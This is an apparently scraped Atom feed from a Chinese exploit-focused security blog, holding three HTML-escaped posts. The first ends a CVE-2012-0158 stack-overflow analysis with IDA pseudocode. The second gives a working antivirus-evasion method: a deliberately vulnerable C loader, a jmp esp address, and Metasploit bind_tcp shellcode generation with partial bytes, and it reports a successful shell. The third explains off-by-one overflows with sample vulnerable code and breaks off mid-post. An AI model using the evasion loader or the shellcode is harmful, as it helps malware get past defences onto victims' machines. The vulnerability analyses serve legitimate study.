&lt;p&gt;在 IDA 中观察伪代码可以清晰地看到整个流程：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;int __stdcall sub_275C89C7(int a1, void *lpMem)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  void *v2; // ebx@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int result; // eax@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v4; // esi@4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v5; // [sp+Ch] [bp-14h]@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  SIZE_T dwBytes; // [sp+14h] [bp-Ch]@3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v7; // [sp+18h] [bp-8h]@4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v8; // [sp+1Ch] [bp-4h]@8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v2 = lpMem;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  //第一次拷贝 0xC 字节&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  result = sub_275C876D(&amp;amp;v5, lpMem, 0xCu);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( result &amp;gt;= 0 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  	//判断错误，应该为 &amp;lt;= 8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ( v5 == 1784835907 &amp;amp;&amp;amp; dwBytes &amp;gt;= 8 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      //第二次调用，dwBytes=0x8282，造成溢出&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      v4 = sub_275C876D(&amp;amp;v7, v2, dwBytes);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      if ( v4 &amp;gt;= 0 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      ······ 省略中间代码 ······&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  return result;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int __cdecl sub_275C876D(void *a1, LPVOID lpMem, SIZE_T dwBytes)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  LPVOID v3; // ebx@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int result; // eax@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  LPVOID v5; // eax@3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v6; // esi@4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v7; // [sp+Ch] [bp-4h]@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  const void *lpMema; // [sp+1Ch] [bp+Ch]@3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v3 = lpMem;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  result = (*(int (__stdcall **)(LPVOID, int *, signed int, _DWORD))(*(_DWORD *)lpMem + 12))(lpMem, &amp;amp;v7, 4, 0);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( result &amp;gt;= 0 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    if ( v7 == dwBytes )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      ······ 省略中间代码 ······&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        if ( v6 &amp;gt;= 0 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          ;memcpy 造成溢出&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          memcpy(a1, lpMema, dwBytes);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          v6 = (*(int (__stdcall **)(LPVOID, _UNKNOWN *, SIZE_T, _DWORD))(*(_DWORD *)v3 + 12))(&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                 v3,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                 &amp;amp;unk_27632368,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                 ((dwBytes + 3) &amp;amp; 0xFFFFFFFC) - dwBytes,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                 0);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ······ 省略中间代码 ······&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.xjymw.cn/wangluoguanli/wangluoanquan/2015/0415/70150.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Step by Step 调试 CVE‐2012‐0158 POC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.binvul.com/viewthread.php?tid=66&amp;amp;highlight=CVE-2012-0158%2BMSCOMCTL%2B%E6%8E%A7%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CVE-2012-0158 MSCOMCTL控件漏洞分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;感谢@大师傅、@二师傅、@小师傅的帮助！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这个漏洞分析了几天才搞懂，实战与做实验区别还是很大的。&lt;/p&gt;
&lt;h2 id=&quot;漏洞概要&quot;&gt;&lt;a href=&quot;#漏洞概要&quot; class=&quot;headerlink&quot; title=&quot;漏洞概要&quot;&gt;&lt;/a&gt;漏洞概要&lt;/h2&gt;&lt;p&gt;此漏洞是一个栈溢出漏洞，是由于 Microsoft Windows Common Controls 的 MSCOMCTL.TreeView、MSCOMCTL.ListView2、MSCOMCTL.TreeView2、MSCOMCTL.ListView 控件（MSCOMCTL.OCX）中存在错误，可被利用破坏内存，导致任意代码执行。
    
    </summary>
    
      <category term="Exploit" scheme="http://sh3ll.me/categories/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>通过溢出漏洞绕过杀毒防护</title>
    <link href="http://sh3ll.me/2015/09/03/bypass-av-with-exploit/"/>
    <id>http://sh3ll.me/2015/09/03/bypass-av-with-exploit/</id>
    <published>2015-09-03T08:13:13.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;p&gt;通过编写一具有溢出漏洞的程序，并将恶意代码写入 shellcode 中，溢出后执行 shellcode 可以绕过杀毒软件的防护。&lt;/p&gt;
&lt;h2 id=&quot;测试环境&quot;&gt;&lt;a href=&quot;#测试环境&quot; class=&quot;headerlink&quot; title=&quot;测试环境&quot;&gt;&lt;/a&gt;测试环境&lt;/h2&gt;&lt;p&gt;Platform：Windows XP SP3&lt;br&gt;Compiler：VC 6.0&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;测试代码&quot;&gt;&lt;a href=&quot;#测试代码&quot; class=&quot;headerlink&quot; title=&quot;测试代码&quot;&gt;&lt;/a&gt;测试代码&lt;/h2&gt;&lt;p&gt;构造如下漏洞代码加载 shellcode：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#include &amp;lt;string.h&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void overflow(char * input)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	char buf[4];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	strcpy(buf, input);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void main()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	char shellcode[] = &amp;quot;AAAAAAAA&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x7b\x46\x86\x7c&amp;quot;			//jmp esp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x90\x90\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x90\x90\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x90\x90\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x90\x90\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x90\x90\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;shellcode&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x90\x90\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x90\x90\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x90\x90\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x90\x90\x90\x90&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x90\x90\x90\x90&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	overflow(shellcode);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先，通过 &lt;code&gt;msfpayload&lt;/code&gt; 生成一 payload，进行查杀，发现大部分杀毒都会报毒：&lt;br&gt;&lt;img src=&quot;/images/2015/09/03/bypass-av-with-exploit-1.png&quot; alt=&quot;图 1&quot;&gt;&lt;/p&gt;
&lt;p&gt;生成 shellcode，并填入源码中：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;msf &amp;gt; use payload/windows/shell/bind_tcp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;msf payload(bind_tcp) &amp;gt; generate -b &amp;apos;\x00&amp;apos; -t c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/*&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; * windows/shell/bind_tcp - 312 bytes (stage 1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; * http://www.metasploit.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; * Encoder: x86/shikata_ga_nai&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; * VERBOSE=false, LPORT=4444, RHOST=, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; * PayloadUUIDTracking=false, EnableStageEncoding=false, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; * StageEncoderSaveRegisters=, StageEncodingFallback=true, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; * PrependMigrate=false, EXITFUNC=none, InitialAutoRunScript=, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; * AutoRunScript=&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; */&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;unsigned char buf[] = &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\xbd\x81\xf6\x2c\x43\xd9\xe9\xd9\x74\x24\xf4\x58\x31\xc9\xb1&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x48\x83\xc0\x04\x31\x68\x0f\x03\x68\x8e\x14\xd9\xbf\x78\x5a&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x22\x40\x78\x3b\xaa\xa5\x49\x7b\xc8\xae\xf9\x4b\x9a\xe3\xf5&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;quot;\x20\xce\x17\x8e\x45\xc7\x18\x27\xe3\x31\x16\xb8\x58\x01\x39&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;······&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;编译后发现成功绕过绝大多数杀毒软件：&lt;br&gt;&lt;img src=&quot;/images/2015/09/03/bypass-av-with-exploit-2.png&quot; alt=&quot;图 2&quot;&gt;&lt;br&gt;成功返回 shell（test with 360）：&lt;br&gt;&lt;img src=&quot;/images/2015/09/03/bypass-av-with-exploit-3.png&quot; alt=&quot;图 3&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/2015/09/03/bypass-av-with-exploit-4.png&quot; alt=&quot;图 4&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;其他&quot;&gt;&lt;a href=&quot;#其他&quot; class=&quot;headerlink&quot; title=&quot;其他&quot;&gt;&lt;/a&gt;其他&lt;/h2&gt;&lt;p&gt;@糖果师傅说这个思路在 02 年的时候就已经被提出来个，但是不知道为什么还是可以用，估计原因是杀毒软件还是偏向于静态查杀？&lt;br&gt;附 2002 年 Xcon 上的相关资料：&lt;a href=&quot;http://www.xfocus.net/projects/Xcon/2002/Xcon2002_flashsky.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;溢出植入型木马（后门）的原型实现&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;p&gt;通过编写一具有溢出漏洞的程序，并将恶意代码写入 shellcode 中，溢出后执行 shellcode 可以绕过杀毒软件的防护。&lt;/p&gt;
&lt;h2 id=&quot;测试环境&quot;&gt;&lt;a href=&quot;#测试环境&quot; class=&quot;headerlink&quot; title=&quot;测试环境&quot;&gt;&lt;/a&gt;测试环境&lt;/h2&gt;&lt;p&gt;Platform：Windows XP SP3&lt;br&gt;Compiler：VC 6.0
    
    </summary>
    
      <category term="Exploit" scheme="http://sh3ll.me/categories/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>对 Off by one Overflow 与 攻击 C++虚函数的理解</title>
    <link href="http://sh3ll.me/2015/08/11/offbyone-and-cpp-virtual-function/"/>
    <id>http://sh3ll.me/2015/08/11/offbyone-and-cpp-virtual-function/</id>
    <published>2015-08-11T13:44:07.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Off-by-one-Overflow&quot;&gt;&lt;a href=&quot;#Off-by-one-Overflow&quot; class=&quot;headerlink&quot; title=&quot;Off by one Overflow&quot;&gt;&lt;/a&gt;Off by one Overflow&lt;/h2&gt;&lt;p&gt;与常规的溢出不同，Off by one 只溢出一个字节，刚好可以突破 buffer 边界，大多数情况下并不是严重问题。但如果缓冲区后面跟着 EBP 和返回地址时，溢出的一个字节导致我们『部分』地控制 EBP（EBP 最低位），如果可以让 EBP 落入缓冲区中就可以控制 EIP，进而劫持进程。&lt;br&gt;一字节溢出常出现的场景包括：&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;字符串 00 结束符&lt;/li&gt;
&lt;li&gt;while (i &amp;lt;= max) …&lt;/li&gt;
&lt;li&gt;for (i=0; i&amp;lt;=max; i++) …&lt;br&gt;类似如下代码：&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;//vuln.c&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#include &amp;lt;string.h&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void foo(char* arg);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void bar(char* arg);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void foo(char* arg) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	bar(arg); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void bar(char* arg) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	char buf[256];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	strcpy(buf, arg); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int main(int argc, char *argv[]) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if(strlen(argv[1])&amp;gt;256) &amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		printf(&amp;quot;Attempted Buffer Overflow\n&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		fflush(stdout);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		return -1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	foo(argv[1]); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;虽然代码中对输入长度进行判断，但若输入”AAAAA”（256个 A），刚好可以通过该判断，字符串结束符『\x00』会覆盖 EBP 的最低位，如果覆盖后的 EBP 指向我们的 buffer中，便可以劫持进程（Windows XP SP3上未复现）。&lt;/p&gt;
&lt;h2 id=&quot;攻击-C-虚函数&quot;&gt;&lt;a href=&quot;#攻击-C-虚函数&quot; class=&quot;headerlink&quot; title=&quot;攻击 C++ 虚函数&quot;&gt;&lt;/a&gt;攻击 C++ 虚函数&lt;/h2&gt;&lt;p&gt;《C Primer Plus》只看了一点就扔下了，导致这里开始完全不懂，Google 了些资料后了解了其用法及机制。&lt;/p&gt;
&lt;blockquote&gt;
